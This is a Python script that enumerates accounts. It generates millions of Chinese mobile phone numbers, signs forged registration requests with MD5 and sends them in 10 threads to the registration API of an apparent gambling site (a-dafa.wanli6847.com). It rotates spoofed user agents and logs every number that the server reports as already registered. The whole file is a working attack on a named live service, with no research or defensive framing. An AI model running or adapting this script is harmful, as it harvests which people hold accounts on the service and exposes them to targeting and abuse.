import sys
import threading
import time
import requests
import hashlib
import random
import json
from queue import Queue


class test_phone(threading.Thread):
    def __init__(self, queue, total, name):
        threading.Thread.__init__(self)
        self._queue = queue
        self._total = total
        self._name = name

    def msg(self):
        per = 100 - float(self._queue.qsize()) / float(self._total) * 100
        percent = "%s Finished for %s | %s All| Scan in %1.f %s" % (
            (self._total - self._queue.qsize()), self._name, self._total, per, '%')
        sys.stdout.write('\r' + '[*]' + percent)

    def get_user_agent(self):
        user_agent_list = [
            {'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)'},
            {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00'},
            {
                'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.2) Gecko/2008092313 Ubuntu/8.04 (hardy) Firefox/3.0.2'},
            {
                'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.15) Gecko/20101027 Fedora/3.5.15-1.fc12 Firefox/3.5.15'},
            {
                'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.551.0 Safari/534.10'},
            {'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092809 Gentoo Firefox/3.0.2'},
            {
                'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.544.0'},
            {'User-Agent': 'Opera/9.10 (Windows NT 5.2; U; en)'},
            {
                'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko)'},
            {'User-Agent': 'Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10'},
            {
                'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5'},
            {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3'},
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'},
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20'},
            {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)'},
            {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60'},
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4'},
            {'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51'}
        ]

        return random.choice(user_agent_list)

    def run(self):
        while not self._queue.empty():
            phone = self._queue.get()
            threading.Thread(target=self.msg).start()

            randomId = str(int(time.time()))
            strAccounts = str(phone)
            strMachineID = str(hashlib.md5(
                strAccounts.encode(encoding='utf-8')))

            loginSign_str = "cbDeviceType=17&cbGender=1&dwGameID=0&dwSource=100000&dwSpreaderGameID=0&projectSign=dafa&randomId=" + \
                str(randomId)+"&strAccounts="+strAccounts+"&strLogonPass=E10ADC3949BA59ABBE56E057F20F883E&strMachineID=" + \
                strMachineID+"&strMobilePhone=656454&strNickName=&wFaceID=176b3830298a2bec65e2a3428a528f767"

            m = hashlib.md5(loginSign_str.encode(encoding='utf-8'))

            data = {"randomId": randomId, "dwGameID": 0, "cbDeviceType": 17, "strNickName": "", "dwSource": 100000, "projectSign": "dafa",
                    "strLogonPass": "E10ADC3949BA59ABBE56E057F20F883E", "strAccounts": strAccounts,
                    "strMachineID": strMachineID, "strMobilePhone": 656454, "dwSpreaderGameID": 0, "cbGender": 1, "wFaceID": 1}

            data['loginSign'] = m.hexdigest().upper()
            try:
                requests.adapters.DEFAULT_RETRIES = 5
                s = requests.session()
                s.keep_alive = False
                res = requests.post(url="http://a-dafa.wanli6847.com:9898/api/applogin/exclude/registerAccounts",
                                    headers=self.get_user_agent(), json=data, timeout=20)
                res.close()
                dic = json.loads(res.text)
                del (res)

                if("此帐号已被注册，请换另一帐号尝试再次注册！" == dic['msg']):
                    with open("result.txt", "a+", encoding="utf-8") as f:
                        f.write(str(phone) + "\n")
            except Exception:
                with open("re.txt", "a+", encoding="utf-8") as f:
                    f.write(str(phone) + "\n")
                pass


def main():
    queue = Queue()
    prefix_list = ['157', '187', '183', '151', '180']
    for pre in prefix_list:
        for mid in range(5405, 5500):
            mid = (4 - len(str(mid))) * "0" + str(mid)
            prefix = str(pre) + str(mid)
            for stuffx in range(0, 10000):
                stuffx = (4 - len(str(stuffx))) * "0" + str(stuffx)
                phonenum = str(prefix) + str(stuffx)
                queue.put(phonenum)

            total = queue.qsize()
            threads = []
            thread_count = int(10)
            for i in range(thread_count):
                threads.append(test_phone(queue, total, prefix))
            for thread in threads:
                thread.setDaemon(True)
                thread.start()
            for thread in threads:
                thread.join()
            print("\n")


if __name__ == '__main__':
    main()
